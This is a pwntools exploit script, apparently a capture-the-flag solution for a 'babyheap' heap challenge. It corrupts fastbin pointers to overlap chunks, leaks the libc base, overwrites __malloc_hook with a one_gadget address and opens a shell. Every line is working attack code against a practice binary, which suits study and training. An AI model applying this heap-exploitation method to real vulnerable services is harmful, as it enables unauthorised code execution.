from pwn import *
import sys

DEBUG=1

#p=process('./babyheap',env={'LD_PRELOAD':'./libc.so.6'})
p=process('./babyheap')
#elf=ELF('./libc.so.6')

if DEBUG==1:
    context.log_level='debug'
    gdb.attach(p)

#malloc_hook=elf.symbols['__malloc_hook']
#one_gadget=0x41374
malloc_hook=0x3c4b10
one_gadget=0x4526A

def sd(c):
    p.send(c)

def rv(c):
    p.recvuntil(c)

def sl(c):
    p.sendline(c)

def add(size):
    rv('d: ')
    sl('1')
    rv('e: ')
    sl(str(size))

def fill(index,size,c):
    rv('d: ')
    sl('2')
    rv('ex: ')
    sl(str(index))
    rv('ze: ')
    sl(str(size))
    rv('ent: ')
    sd(c)

def delete(index):
    rv('d: ')
    sl('3')
    rv('ex: ')
    sl(str(index))

def dump(index):
    rv('d: ')
    sl('4')
    rv('ex: ')
    sl(str(index))

#---------------------------
# leak,leak,emmmmmmmm

add(0x20)                       #0
add(0x20)                       #1
add(0x20)                       #2
add(0x20)                       #3
add(0x80)                       #4

delete(1)
delete(2)                       # add the address in [2]'s fd

payload=p64(0)*5+p64(0x31)
payload=payload*2+p8(0xc0)      # point to 4
fill(0,len(payload),payload)    # overwrite the fd pointer

payload=p64(0)*5+p64(0x31)
fill(3,len(payload),payload)    # bypass the check

add(0x20)                       #1
add(0x20)                       #2
                                #now the 2 and 4 are overlapped
payload=p64(0)*5+p64(0x91)
fill(3,len(payload),payload)
add(0x80)                       #5
delete(4)
dump(2)
rv('Content: \n')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
log.info('libc base: '+hex(libc_base))

add(0x68)                       #4
delete(4)
fill(2,8,p64(libc_base+malloc_hook-0x23))
add(0x68)                       #4
add(0x68)                       #6
fill(6,27,'a'*19+p64(libc_base+one_gadget))       # overwrite the __malloc_hook

add(0x20)                       # pwned!
p.interactive()                 





